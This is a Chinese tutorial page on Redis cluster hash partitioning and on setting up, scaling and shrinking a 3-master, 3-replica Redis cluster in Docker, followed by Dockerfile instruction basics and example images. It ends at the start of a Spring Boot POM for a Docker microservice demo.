<p>  原来规划好的节点，进行扩容或者缩容就比较麻烦了额，不管扩缩，每次数据变动导致节点有变动，映射关系需要重新进行计算，在服务器个数固定不变时没有问题，如果需要弹性扩容或故障停机的情况下，原来的取模公式就会发生变化：Hash(key)/3会变成Hash(key) /?。此时地址经过取余运算的结果将发生很大变化，根据公式获取的服务器也会变得不可控。</p>
<p>某个redis机器宕机了，由于台数数量变化，会导致hash取余全部数据重新洗牌。</p>
<h3 id="2-2-一致性哈希算法分区"><a href="#2-2-一致性哈希算法分区" class="headerlink" title="2.2 一致性哈希算法分区"></a>2.2 一致性哈希算法分区</h3><p>设计目标是为了解决分布式缓存数据变动和映射问题，某个机器宕机了，分母数量改变了，自然取余数不OK了。</p>
<p>能干嘛：提出一致性Hash解决方案，目的是当服务器个数发生变动时，</p>
<p>尽量减少影响客户端到服务器的映射关系</p>
<p>三大步骤</p>
<p>（1）算法构建一致性哈希环</p>
<p><img src="/2022/02/07/Docker/image-20220212224033069.png" alt="image-20220212224033069"></p>
<p>（2）服务器IP节点映射</p>
<p>节点映射</p>
<p>将集群中各个IP节点映射到环上的某一个位置。将各个服务器使用Hash进行一个哈希，具体可以选择服务器的IP或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置。假如4个节点NodeA、B、C、D，经过IP地址的哈希函数计算(hash(ip))，使用IP地址哈希后在环空间的位置如下： </p>
<p><img src="/2022/02/07/Docker/image-20220212224131020.png" alt="image-20220212224131020"></p>
<p>（3）key落到服务器的落键规则</p>
<p><img src="/2022/02/07/Docker/image-20220212224217743.png" alt="image-20220212224217743"></p>
<p>优点：</p>
<p>一致性哈希算法的容错性<img src="/2022/02/07/Docker/image-20220212224316469.png" alt="image-20220212224316469"></p>
<p>一致性哈希算法的扩展性<img src="/2022/02/07/Docker/image-20220212224348720.png" alt="image-20220212224348720"></p>
<p>缺点：一致性哈希算法的数据倾斜问题<img src="/2022/02/07/Docker/image-20220212224427256.png" alt="image-20220212224427256"></p>
<p>为了在节点数目发生改变时尽可能少的迁移数据</p>
<p>将所有的存储节点排列在收尾相接的Hash环上，每个key在计算Hash后会顺时针找到临近的存储节点存放。而当有节点加入或退出时仅影响该节点在Hash环上顺时针相邻的后续节点。  </p>
<p>优点</p>
<p>加入和删除节点只影响哈希环中顺时针方向的相邻的节点，对其他节点无影响。 </p>
<p>缺点 </p>
<p>数据的分布和节点的位置有关，因为这些节点不是均匀的分布在哈希环上的，所以数据在进行存储时达不到均匀分布的效果。</p>
<h3 id="2-3-哈希槽分区"><a href="#2-3-哈希槽分区" class="headerlink" title="2.3 哈希槽分区"></a>2.3 哈希槽分区</h3><p>1 为什么出现</p>
<p><img src="/2022/02/07/Docker/B092D6BA-CBC8-458C-9C6B-68E4357948E9.png" alt="img"></p>
<p>哈希槽实质就是一个数组，数组[0,2^14 -1]形成hash slot空间。</p>
<p>2 能干什么</p>
<p>解决均匀分配的问题，在数据和节点之间又加入了一层，把这层称为哈希槽（slot），用于管理数据和节点之间的关系，现在就相当于节点上放的是槽，槽里放的是数据。</p>
<p><img src="/2022/02/07/Docker/18117874-0250-475E-98C5-A72363165352.png" alt="img"></p>
<p>槽解决的是粒度问题，相当于把粒度变大了，这样便于数据移动。</p>
<p>哈希解决的是映射问题，使用key的哈希值来计算所在的槽，便于数据分配。</p>
<p>3 多少个hash槽</p>
<p>一个集群只能有16384个槽，编号0-16383（0-2^14-1）。这些槽会分配给集群中的所有主节点，分配策略没有要求。可以指定哪些编号的槽分配给哪个主节点。集群会记录节点和槽的对应关系。解决了节点和槽的关系后，接下来就需要对key求哈希值，然后对16384取余，余数是几key就落入对应的槽里。slot = CRC16(key) % 16384。以槽为单位移动数据，因为槽的数目是固定的，处理起来比较容易，这样数据移动问题就解决了。</p>
<p>4、哈希槽计算</p>
<p>Redis 集群中内置了 16384 个哈希槽，redis 会根据节点数量大致均等的将哈希槽映射到不同的节点。当需要在 Redis 集群中放置一个 key-value时，redis 先对 key 使用 crc16 算法算出一个结果，然后把结果对 16384 求余数，这样每个 key 都会对应一个编号在 0-16383 之间的哈希槽，也就是映射到某个节点上。如下代码，key之A 、B在Node2， key之C落在Node3上</p>
<p><img src="/2022/02/07/Docker/33F503D4-31B6-4E84-AF77-4406C24D49CD.png" alt="img"><img src="/2022/02/07/Docker/E5C62422-B400-45C4-9088-948C85F5E106.png" alt="img"></p>
<h3 id="2-4-3主3从Redis集群配置"><a href="#2-4-3主3从Redis集群配置" class="headerlink" title="2.4  3主3从Redis集群配置"></a>2.4  3主3从Redis集群配置</h3><p><img src="/2022/02/07/Docker/image-20220213152623633.png" alt="image-20220213152623633"></p>
<p>(1)关闭防火墙+启动docker后台服务:systemctl start docker</p>
<p>(2)新建6个docker容器redis实例</p>
<p>docker run -d –name redis-node-1 –net host –privileged=true -v /data/redis/share/redis-node-1:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6381</p>
<p>docker run -d –name redis-node-2 –net host –privileged=true -v /data/redis/share/redis-node-2:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6382</p>
<p>docker run -d –name redis-node-3 –net host –privileged=true -v /data/redis/share/redis-node-3:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6383</p>
<p>docker run -d –name redis-node-4 –net host –privileged=true -v /data/redis/share/redis-node-4:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6384</p>
<p>docker run -d –name redis-node-5 –net host –privileged=true -v /data/redis/share/redis-node-5:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6385</p>
<p>docker run -d –name redis-node-6 –net host –privileged=true -v /data/redis/share/redis-node-6:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6386</p>
<p><img src="/2022/02/07/Docker/image-20220213154041382.png" alt="image-20220213154041382"></p>
<p><img src="/2022/02/07/Docker/image-20220213154225145.png" alt="image-20220213154225145"></p>
<p>(3)进入容器redis-node-1并为6台机器构建集群关系</p>
<p>进入容器:docker exec -it redis-node-1 /bin/bash</p>
<p>构建主从关系:</p>
<p>//注意，进入docker容器后才能执行一下命令，且注意自己的真实IP地址</p>
<p>redis-cli –cluster create 192.168.197.134:6381 192.168.197.134:6382 192.168.197.134:6383 192.168.197.134:6384 192.168.197.134:6385 192.168.197.134:6386 –cluster-replicas 1</p>
<p>–cluster-replicas 1 表示为每个master创建一个slave节点</p>
<p><img src="/2022/02/07/Docker/D4277273-2FFA-43F0-A785-73E231EF730F.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/064A4706-871A-485A-81FA-6DAF751D4210.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/598CCFE2-4BA6-4F2D-9CBC-1813141DBFEC.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/E2DD876A-1E4C-4F88-8330-3C45B1A7A403.png" alt="img"></p>
<p>(4)链接进入6381作为切入点，查看集群状态</p>
<p>链接进入6381作为切入点，查看节点状态:<img src="/2022/02/07/Docker/D78382B9-AA7F-4C7E-8B52-FF9C83E08ECC.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/C6C5B559-5618-4CFF-9BFB-07931D24BE7A.png" alt="img"></p>
<p>cluster info：查看集群信息              cluster nodes：查看集群节点</p>
<h3 id="2-5-主从容错切换迁移案例"><a href="#2-5-主从容错切换迁移案例" class="headerlink" title="2.5 主从容错切换迁移案例"></a>2.5 主从容错切换迁移案例</h3><p>一、数据读写存储</p>
<p>(1)启动6机构成的集群并通过exec进入</p>
<p>(2)对6381新增两个key           set k1 v1</p>
<p>(3)防止路由失效加参数-c并新增两个key</p>
<p><img src="/2022/02/07/Docker/image-20220213163655007.png" alt="image-20220213163655007"></p>
<p>(4)查看集群信息</p>
<p><img src="/2022/02/07/Docker/image-20220213163743429.png" alt="image-20220213163743429"></p>
<p>二、容错切换迁移</p>
<p><img src="/2022/02/07/Docker/image-20220213171227145.png" alt="image-20220213171227145"></p>
<p>(1)主6381和从机切换，先停止主机6381:   6381主机停了，对应的真实从机上位,   6381作为1号主机分配的从机以实际情况为准，具体是几号机器就是几号</p>
<p>(2)再次查看集群信息<img src="/2022/02/07/Docker/image-20220213163932204.png" alt="image-20220213163932204"></p>
<p>(3)先还原之前的3主3从</p>
<p><img src="/2022/02/07/Docker/image-20220213164022236.png" alt="image-20220213164022236"></p>
<p>让6381上位</p>
<p>/1:先启6381:docker start redis-node-1</p>
<p><img src="/2022/02/07/Docker/image-20220213164121784.png" alt="image-20220213164121784"></p>
<p>/2:再停6385: docker stop redis-node-5</p>
<p><img src="/2022/02/07/Docker/image-20220213164200714.png" alt="image-20220213164200714"></p>
<p>/3:再启6385: docker start redis-node-5</p>
<p><img src="/2022/02/07/Docker/image-20220213164237414.png" alt="image-20220213164237414"></p>
<p>主从机器分配情况以实际情况为准</p>
<p>(4)查看集群状态:  redis-cli –cluster check 自己IP:6381</p>
<p><img src="/2022/02/07/Docker/image-20220213164354754.png" alt="image-20220213164354754"></p>
<h3 id="2-6-主从扩容案例"><a href="#2-6-主从扩容案例" class="headerlink" title="2.6 主从扩容案例"></a>2.6 主从扩容案例</h3><p><img src="/2022/02/07/Docker/image-20220213204606462.png" alt="image-20220213204606462"></p>
<p>(1)新建6387、6388两个节点+新建后启动+查看是否8节点</p>
<p>docker run -d –name redis-node-7 –net host –privileged=true -v /data/redis/share/redis-node-7:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6387</p>
<p>docker run -d –name redis-node-8 –net host –privileged=true -v /data/redis/share/redis-node-8:/data redis:6.0.8 –cluster-enabled yes –appendonly yes –port 6388</p>
<p>docker ps</p>
<p>(2)进入6387容器实例内部: docker exec -it redis-node-7 /bin/bash</p>
<p>(3)将新增的6387节点(空槽号)作为master节点加入原集群</p>
<p>将新增的6387作为master节点加入集群</p>
<p>redis-cli –cluster add-node 192.168.197.134:6387 192.168.197.134:6381</p>
<p>6387 就是将要作为master新增节点</p>
<p>6381 就是原来集群节点里面的领路人，相当于6387拜拜6381的码头从而找到组织加入集群</p>
<p><img src="/2022/02/07/Docker/49E80A0B-C3FD-49D9-9409-9D0C82FC463C.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/4D75E348-BAC0-429A-9C98-5BFAD81114CA.png" alt="img"></p>
<p>(4)检查集群情况第1次：redis-cli –cluster check 真实ip地址:6381</p>
<p><img src="/2022/02/07/Docker/image-20220213201909022.png" alt="image-20220213201909022"></p>
<p>(5)重新分派槽号:  </p>
<p>命令:redis-cli –cluster reshard IP地址:端口号</p>
<p>redis-cli –cluster reshard 192.168.197.134:6381</p>
<p><img src="/2022/02/07/Docker/09AA7C35-AFB1-4309-AB04-295DEA79878B.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/C5A96F2D-713D-4C9C-A860-994A9BA0A326.png" alt="img"></p>
<p>(6)检查集群情况第2次<img src="/2022/02/07/Docker/image-20220213202227384.png" alt="image-20220213202227384"></p>
<p>槽号分派说明<img src="/2022/02/07/Docker/image-20220213202303503.png" alt="image-20220213202303503"></p>
<p>(7)为主节点6387分配从节点6388</p>
<p>命令：redis-cli –cluster add-node ip:新slave端口 ip:新master端口 –cluster-slave –cluster-master-id 新主机节点ID</p>
<p>redis-cli –cluster add-node 192.168.197.134:6388 192.168.197.134:6387 –cluster-slave –cluster-master-id 99eeb627c6118063f80d5114ee1529164c13f94e——-这个是6387的编号，按照自己实际情况</p>
<p><img src="/2022/02/07/Docker/14642150-7924-4203-B431-0F7BBC4F433C.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/C400F205-278F-40DE-9C47-5F1380C14714.png" alt="img"></p>
<p>(8)检查集群情况第3次</p>
<p>redis-cli –cluster check 192.168.111.147:6382</p>
<p><img src="/2022/02/07/Docker/C830B96B-8670-44C9-8AED-41D069FCEA8E.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/6869CBA5-1DFA-4792-9742-B3E0FAE9CA2C.png" alt="img"></p>
<h3 id="2-7-主从缩容案例"><a href="#2-7-主从缩容案例" class="headerlink" title="2.7 主从缩容案例"></a>2.7 主从缩容案例</h3><p><img src="/2022/02/07/Docker/image-20220213221352424.png" alt="image-20220213221352424"></p>
<p>(1)目的：6387和6388下线</p>
<p>(2)检查集群情况1获得6388的节点ID<img src="/2022/02/07/Docker/image-20220213202817038.png" alt="image-20220213202817038"></p>
<p>(3)将6388删除, 从集群中将4号从节点6388删除</p>
<p>命令：redis-cli –cluster del-node ip:从机端口 从机6388节点ID</p>
<p>redis-cli –cluster del-node 192.168.197.134:6388 1014e96beb9138d683695cc0d3c44112c26bf88e</p>
<p><img src="/2022/02/07/Docker/EFD07548-B595-4D36-B2F0-C078CD305CE9.png" alt="img"></p>
<p>redis-cli –cluster check 192.168.197.134:6382</p>
<p>检查一下发现，6388被删除了，只剩下7台机器了。</p>
<p><img src="/2022/02/07/Docker/545BBAAE-6FD7-4220-872F-E26D4B0161DF.png" alt="img"></p>
<p>(4)将6387的槽号清空，重新分配，本例将清出来的槽号都给6381</p>
<p>redis-cli –cluster reshard 192.168.197.134:6381</p>
<p>以6381作为突破口，对整个集群进行hash槽位的分配</p>
<p><img src="/2022/02/07/Docker/402BE5DE-5825-4546-ADB5-582CA7E65ABF.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/B7D51FAD-7143-47AC-88AA-0154A423D550.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/0064A3C2-5DFC-4972-868C-48E78EBA659F.png" alt="img"></p>
<p>(5)检查集群情况第二次</p>
<p>redis-cli –cluster check 192.168.111.147:6381</p>
<p>4096个槽位都指给6381，它变成了8192个槽位，相当于全部都给6381了，不然要输入3次，一锅端</p>
<p><img src="/2022/02/07/Docker/293AE6BF-7F23-42A8-BBC5-CE5F511DCC5F.png" alt="img"></p>
<p>(6)将6387删除</p>
<p>命令：redis-cli –cluster del-node ip:端口 6387节点ID</p>
<p>redis-cli –cluster del-node 192.168.197.134:6387 99eeb627c6118063f80d5114ee1529164c13f94e<img src="/2022/02/07/Docker/ADEFCFBE-A68C-4B19-A2A3-C9502FF86C66.png" alt="img"></p>
<p>(7)检查集群情况第三次</p>
<p>redis-cli –cluster check 192.168.111.147:6381</p>
<p><img src="/2022/02/07/Docker/F92B21F5-B528-46E6-A6B1-80273382DC06.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/image-20220213224610872.png" alt="image-20220213224610872"></p>
<h1 id="DockerFile解析"><a href="#DockerFile解析" class="headerlink" title="DockerFile解析"></a>DockerFile解析</h1><p>Dockerfile是用来构建Docker镜像的文本文件，是由一条条构建镜像所需的指令和参数构成的脚本。<img src="/2022/02/07/Docker/image-20220213225311309.png" alt="image-20220213225311309"></p>
<p>官网: <a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></p>
<p>构建三步骤:  1、编写Dockerfile文件  2、docker build命令构建镜像  3、docker run依镜像运行容器实例</p>
<h2 id="一、DockerFile构建过程解析"><a href="#一、DockerFile构建过程解析" class="headerlink" title="一、DockerFile构建过程解析"></a>一、DockerFile构建过程解析</h2><h3 id="1-1-Dockerfile内容基础知识"><a href="#1-1-Dockerfile内容基础知识" class="headerlink" title="1.1 Dockerfile内容基础知识"></a>1.1 Dockerfile内容基础知识</h3><p>1：每条保留字指令都必须为大写字母且后面要跟随至少一个参数</p>
<p>2：指令按照从上到下，顺序执行</p>
<p>3：#表示注释</p>
<p>4：每条指令都会创建一个新的镜像层并对镜像进行提交</p>
<h3 id="1-2-Docker执行Dockerfile的大致流程"><a href="#1-2-Docker执行Dockerfile的大致流程" class="headerlink" title="1.2 Docker执行Dockerfile的大致流程"></a>1.2 Docker执行Dockerfile的大致流程</h3><p>（1）docker从基础镜像运行一个容器</p>
<p>（2）执行一条指令并对容器作出修改</p>
<p>（3）执行类似docker commit的操作提交一个新的镜像层</p>
<p>（4）docker再基于刚提交的镜像运行一个新容器</p>
<p>（5）执行dockerfile中的下一条指令直到所有指令都执行完成</p>
<h3 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3 总结"></a>1.3 总结</h3><p>从应用软件的角度来看，Dockerfile、Docker镜像与Docker容器分别代表软件的三个不同阶段，</p>
<p>*  Dockerfile是软件的原材料</p>
<p>*  Docker镜像是软件的交付品</p>
<p>*  Docker容器则可以认为是软件镜像的运行态，也即依照镜像运行的容器实例</p>
<p>Dockerfile面向开发，Docker镜像成为交付标准，Docker容器则涉及部署与运维，三者缺一不可，合力充当Docker体系的基石。</p>
<p><img src="/2022/02/07/Docker/0962520D-D4D9-4AC1-9DBE-CF23B510D16D.png" alt="img"></p>
<p>1 Dockerfile，需要定义一个Dockerfile，Dockerfile定义了进程需要的一切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程(当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制)等等;</p>
<p>2 Docker镜像，在用Dockerfile定义一个文件之后，docker build时会产生一个Docker镜像，当运行 Docker镜像时会真正开始提供服务;</p>
<p>3 Docker容器，容器是直接提供服务的。</p>
<h2 id="二、DockerFile常用保留字指令"><a href="#二、DockerFile常用保留字指令" class="headerlink" title="二、DockerFile常用保留字指令"></a>二、DockerFile常用保留字指令</h2><p>参考tomcat8的dockerfile入门：<a target="_blank" rel="noopener" href="https://github.com/docker-library/tomcat">https://github.com/docker-library/tomcat</a></p>
<h3 id="2-1-FROM"><a href="#2-1-FROM" class="headerlink" title="2.1 FROM"></a>2.1 FROM</h3><p>基础镜像，当前新镜像是基于哪个镜像的，指定一个已经存在的镜像作为模板，第一条必须是from</p>
<h3 id="2-2-MAINTAINER"><a href="#2-2-MAINTAINER" class="headerlink" title="2.2 MAINTAINER"></a>2.2 MAINTAINER</h3><p>镜像维护者的姓名和邮箱地址</p>
<h3 id="2-3-RUN"><a href="#2-3-RUN" class="headerlink" title="2.3 RUN"></a>2.3 RUN</h3><p>1、容器构建时需要运行的命令</p>
<p>2、两种格式</p>
<p>shell格式：<img src="/2022/02/07/Docker/BD62EE5C-A8A9-48EE-9A1D-739466C36AD0.png" alt="img">RUN  RUN yum -y install vim</p>
<p>exec格式: <img src="/2022/02/07/Docker/695B7E7D-AEFE-4571-8FDD-825D52A6FE16.png" alt="img"></p>
<p>3、RUN是在 docker build时运行</p>
<h3 id="2-4-EXPOSE"><a href="#2-4-EXPOSE" class="headerlink" title="2.4 EXPOSE"></a>2.4 EXPOSE</h3><p>当前容器对外暴露出的端口</p>
<h3 id="2-5-WORKDIR"><a href="#2-5-WORKDIR" class="headerlink" title="2.5 WORKDIR"></a>2.5 WORKDIR</h3><p>指定在创建容器后，终端默认登陆的进来工作目录，一个落脚点</p>
<p><img src="/2022/02/07/Docker/image-20220214201424587.png" alt="image-20220214201424587"></p>
<h3 id="2-6-USER"><a href="#2-6-USER" class="headerlink" title="2.6 USER"></a>2.6 USER</h3><p>指定该镜像以什么样的用户去执行，如果都不指定，默认是root</p>
<h3 id="2-7-ENV"><a href="#2-7-ENV" class="headerlink" title="2.7 ENV"></a>2.7 ENV</h3><p>用来在构建镜像过程中设置环境变量</p>
<p>ENV MY_PATH /usr/mytest</p>
<p>这个环境变量可以在后续的任何RUN指令中使用，这就如同在命令前面指定了环境变量前缀一样；也可以在其它指令中直接使用这些环境变量，比如：WORKDIR $MY_PATH</p>
<h3 id="2-8-ADD"><a href="#2-8-ADD" class="headerlink" title="2.8 ADD"></a>2.8 ADD</h3><p>将宿主机目录下的文件拷贝进镜像且会自动处理URL和解压tar压缩包</p>
<h3 id="2-9-COPY"><a href="#2-9-COPY" class="headerlink" title="2.9 COPY"></a>2.9 COPY</h3><p>类似ADD，拷贝文件和目录到镜像中。</p>
<p>将从构建上下文目录中 &lt;源路径&gt; 的文件/目录复制到新的一层的镜像内的 &lt;目标路径&gt; 位置</p>
<p>1、COPY src dest</p>
<p>2、COPY [“src”, “dest”]</p>
<p>3、&lt;src源路径&gt;：源文件或者源目录</p>
<p>4、&lt;dest目标路径&gt;：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p>
<h3 id="2-10-VOLUME"><a href="#2-10-VOLUME" class="headerlink" title="2.10 VOLUME"></a>2.10 VOLUME</h3><p>容器数据卷，用于数据保存和持久化工作</p>
<h3 id="2-11-CMD"><a href="#2-11-CMD" class="headerlink" title="2.11 CMD"></a>2.11 CMD</h3><p>1、指定容器启动后的要干的事情</p>
<p><img src="/2022/02/07/Docker/image-20220214202426660.png" alt="image-20220214202426660"></p>
<p>2、注意</p>
<p>Dockerfile 中可以有多个 CMD 指令，但只有最后一个生效，CMD 会被 docker run 之后的参数替换</p>
<p>参考官网Tomcat的dockerfile演示讲解，官网最后一行命令：<img src="/2022/02/07/Docker/image-20220213232409847.png" alt="image-20220213232409847"></p>
<p>我们演示自己的覆盖操作<img src="/2022/02/07/Docker/image-20220213232438554.png" alt="image-20220213232438554"></p>
<p>3、它和前面RUN命令的区别</p>
<p>CMD是在docker run 时运行。</p>
<p>RUN是在 docker build时运行。</p>
<h3 id="2-12-ENTRYPOINT"><a href="#2-12-ENTRYPOINT" class="headerlink" title="2.12 ENTRYPOINT"></a>2.12 ENTRYPOINT</h3><p>1、也是用来指定一个容器启动时要运行的命令</p>
<p>2、类似于 CMD 指令，但是ENTRYPOINT不会被docker run后面的命令覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序</p>
<p>3、命令格式和案例说明</p>
<p>命令格式：<img src="/2022/02/07/Docker/2BF7CF2C-2128-4DA3-85C4-D6C47DCB524B.png" alt="img"></p>
<p>ENTRYPOINT可以和CMD一起用，一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参。</p>
<p>当指定了ENTRYPOINT后，CMD的含义就发生了变化，不再是直接运行其命令而是将CMD的内容作为参数传递给ENTRYPOINT指令，他两个组合会变成<img src="/2022/02/07/Docker/8A3A769A-89F1-4501-9A95-844ECCC7E0E5.png" alt="img"></p>
<p>案例如下：假设已通过 Dockerfile 构建了 nginx:test 镜像：</p>
<p><img src="/2022/02/07/Docker/F0BBFBD9-7E89-4798-8243-8FAA539F8CB7.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/image-20220214203607188.png" alt="image-20220214203607188"></p>
<p>4、优点</p>
<p>在执行docker run的时候可以指定 ENTRYPOINT 运行所需的参数。</p>
<p>注意：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p>
<h3 id="2-13-总结"><a href="#2-13-总结" class="headerlink" title="2.13 总结"></a>2.13 总结</h3><p><img src="/2022/02/07/Docker/6328AEDF-4652-46A8-8FB9-97522A60CD78.png" alt="img"></p>
<h2 id="三、案例"><a href="#三、案例" class="headerlink" title="三、案例"></a>三、案例</h2><h3 id="3-1-自定义镜像mycentosjava8"><a href="#3-1-自定义镜像mycentosjava8" class="headerlink" title="3.1 自定义镜像mycentosjava8"></a>3.1 自定义镜像mycentosjava8</h3><p>1、要求</p>
<p>Centos7镜像具备vim+ifconfig+jdk8</p>
<p>JDK的下载镜像地址：官网<img src="/2022/02/07/Docker/image-20220214204047717.png" alt="image-20220214204047717"></p>
<p><a target="_blank" rel="noopener" href="https://mirrors.yangxingzhen.com/jdk/">https://mirrors.yangxingzhen.com/jdk/</a></p>
<p>2、编写</p>
<p>准备编写Dockerfile文件        大写字母D</p>
<p><img src="/2022/02/07/Docker/3EEF5253-25C4-4036-ACA3-199661EB9E94.png" alt="img"></p>
<p>FROM centos</p>
<p>MAINTAINER zzyy</p>
<p>ENV MYPATH /usr/local</p>
<p>WORKDIR $MYPATH</p>
<p>#安装vim编辑器</p>
<p>RUN yum -y install vim</p>
<p>#安装ifconfig命令查看网络IP</p>
<p>RUN yum -y install net-tools</p>
<p>#安装java8及lib库</p>
<p>RUN yum -y install glibc.i686</p>
<p>RUN mkdir /usr/local/java</p>
<p>#ADD 是相对路径jar,把jdk-8u171-linux-x64.tar.gz添加到容器中,安装包必须要和Dockerfile文件在同一位置</p>
<p>ADD jdk-8u171-linux-x64.tar.gz /usr/local/java/</p>
<p>#配置java环境变量</p>
<p>ENV JAVA_HOME /usr/local/java/jdk1.8.0_171</p>
<p>ENV JRE_HOME $JAVA_HOME/jre</p>
<p>ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib:$CLASSPATH</p>
<p>ENV PATH $JAVA_HOME/bin:$PATH</p>
<p>EXPOSE 80</p>
<p>CMD echo $MYPATH</p>
<p>CMD echo “success————–ok”</p>
<p>CMD /bin/bash</p>
<p>3、构建</p>
<p>docker build -t 新镜像名字:TAG .</p>
<p>docker build -t centosjava8:1.5 .</p>
<p><img src="/2022/02/07/Docker/D06DC180-A211-42A2-8883-86B8C72EC79A.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/7ED27FB3-17CB-4BB4-B196-41C928E5B462.png" alt="img"></p>
<p><strong>注意，上面TAG后面有个空格，有个点</strong></p>
<p>4、运行：docker run -it 新镜像名字:TAG </p>
<p> docker run -it centosjava8:1.5 /bin/bash</p>
<p><img src="/2022/02/07/Docker/EC715951-590C-43D6-AEA9-D3D04F21B8C4.png" alt="img"></p>
<p>5、再体会下UnionFS（联合文件系统）</p>
<h3 id="3-2-虚悬镜像"><a href="#3-2-虚悬镜像" class="headerlink" title="3.2 虚悬镜像"></a>3.2 虚悬镜像</h3><p>1、是什么</p>
<p>仓库名、标签都是<none>的镜像，俗称dangling image</none></p>
<p>Dockerfile写一个：</p>
<p>（1） vim Dockerfile</p>
<p>from ubuntu</p>
<p>CMD echo ‘action is success’</p>
<p>（2 ）docker build .</p>
<p><img src="/2022/02/07/Docker/9C94DECE-3033-4715-9581-1D39016CCCFC.png" alt="img"></p>
<p>2、查看</p>
<p>docker image ls -f dangling=true</p>
<p><img src="/2022/02/07/Docker/A5291C4A-5398-4B5D-BA82-F67BDCF63EC5.png" alt="img"></p>
<p>3、删除 </p>
<p>docker image prune</p>
<p>虚悬镜像已经失去存在价值，可以删除</p>
<p><img src="/2022/02/07/Docker/CFA34255-FDB7-42F3-AE12-88D521D52C0F.png" alt="img"></p>
<h3 id="3-3-家庭作业-自定义镜像myubuntu"><a href="#3-3-家庭作业-自定义镜像myubuntu" class="headerlink" title="3.3 家庭作业-自定义镜像myubuntu"></a>3.3 家庭作业-自定义镜像myubuntu</h3><p>1、编写</p>
<p>准备编写DockerFile文件</p>
<p><img src="/2022/02/07/Docker/381411A6-4A65-4E9A-A530-14C963B75378.png" alt="img"></p>
<p>FROM ubuntu</p>
<p>MAINTAINER zzyy</p>
<p>ENV MYPATH /usr/local</p>
<p>WORKDIR $MYPATH</p>
<p>RUN apt-get update</p>
<p>RUN apt-get install net-tools</p>
<p>RUN apt-get install -y vim</p>
<p>#RUN apt-get install -y iproute2</p>
<p>#RUN apt-get install -y inetutils-ping</p>
<p>EXPOSE 80</p>
<p>CMD echo $MYPATH</p>
<p>CMD echo “install inconfig cmd into ubuntu success————–ok”</p>
<p>CMD /bin/bash</p>
<p>2、构建</p>
<p>docker build -t 新镜像名字:TAG .</p>
<p>3、运行</p>
<p>docker run -it 新镜像名字:TAG </p>
<h1 id="Docker微服务实战"><a href="#Docker微服务实战" class="headerlink" title="Docker微服务实战"></a>Docker微服务实战</h1><h2 id="一、通过IDEA新建一个普通微服务模块"><a href="#一、通过IDEA新建一个普通微服务模块" class="headerlink" title="一、通过IDEA新建一个普通微服务模块"></a>一、通过IDEA新建一个普通微服务模块</h2><h3 id="1-1-建Module"><a href="#1-1-建Module" class="headerlink" title="1.1 建Module"></a>1.1 建Module</h3><p>docker_boot</p>
<p><img src="/2022/02/07/Docker/image-20220214215934460.png" alt="image-20220214215934460"></p>
<h3 id="1-2-改POM"><a href="#1-2-改POM" class="headerlink" title="1.2 改POM"></a>1.2 改POM</h3><?xml version="1.0" encoding="UTF-8"?>
<p><project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"><br>    <modelVersion>4.0.0</modelVersion><br>    <parent><br>        <groupId>org.springframework.boot</groupId><br>        <artifactId>spring-boot-starter-parent</artifactId><br>        <version>2.5.6</version><br>        <relativePath><br>    </relativePath></parent></project></p>
<pre><code>&lt;groupId&gt;com.atguigu.docker&lt;/groupId&gt;
&lt;artifactId&gt;docker_boot&lt;/artifactId&gt;
&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;

&lt;properties&gt;
    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
    &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt;
    &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;
    &lt;junit.version&gt;4.12&lt;/junit.version&gt;
    &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt;
    &lt;lombok.version&gt;1.16.18&lt;/lombok.version&gt;
    &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt;
    &lt;druid.version&gt;1.1.16&lt;/druid.version&gt;
    &lt;mapper.version&gt;4.1.5&lt;/mapper.version&gt;
    &lt;mybatis.spring.boot.version&gt;1.3.0&lt;/mybatis.spring.boot.version&gt;
&lt;/properties&gt;

&lt;dependencies&gt;
    &lt;!--SpringBoot通用依赖模块--&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
